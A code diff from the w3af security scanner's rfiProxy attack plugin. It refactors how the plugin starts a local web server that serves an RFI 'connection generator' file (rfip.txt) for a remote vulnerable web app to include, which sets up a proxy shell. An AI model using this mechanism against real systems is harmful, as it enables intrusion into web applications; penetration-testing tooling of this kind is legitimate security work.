@@ -31,7 +31,7 @@ from core.data.kb.shell import shell as shell
 from core.controllers.w3afException import w3afException
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 
-from core.controllers.daemons.webserver import webserver
+import core.controllers.daemons.webserver as webserver
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from core.controllers.threads.w3afThread import w3afThread
 from core.controllers.threads.threadManager import threadManagerObj as tm
@@ -125,7 +125,6 @@ class rfiProxy(baseAttackPlugin, w3afThread):
         self._variable = vuln.getVar()
         
         self.start2()
-        time.sleep(0.5) # wait for webserver thread to start
         
         p = proxy_rfi_shell( self._proxyAddress + ':' + str(self._proxyPort) )
         
@@ -133,8 +132,6 @@ class rfiProxy(baseAttackPlugin, w3afThread):
         
     def stop(self):
         if self._running:
-            if self._wS is not None:
-                self._wS.stop()
             self._proxy.server_close()
             self._go = False
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -182,12 +179,10 @@ class rfiProxy(baseAttackPlugin, w3afThread):
         if self._rfiConnGenerator == '':
             # If user failed to configure self._rfiConnGenerator we will run a webserver
             # and configure the _rfiConnGenerator attr for him
-            if self._wS is None:
-                om.out.information( 'Running a local httpd to serve the RFI connection generator to remote web app.' )
-                webroot = os.path.join('plugins', 'attack', 'rfiProxy')
-                self._wS = webserver( self._proxyPublicIP, self._httpdPort , webroot )
-                self._wS.start2()
-                self._rfiConnGenerator = 'http://' + self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
+            om.out.information('Running a local httpd to serve the RFI connection generator to remote web app.')
+            webroot = os.path.join('plugins', 'attack', 'rfiProxy')
+            webserver.start_webserver(self._proxyPublicIP, self._httpdPort, webroot)
+            self._rfiConnGenerator = 'http://' + self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
             
         ### TODO: I really dislike this, if someone knows how to send variables to 
         ### w3afProxyHandler in a nicer way, please contact me ( andres.riancho@gmail.com )
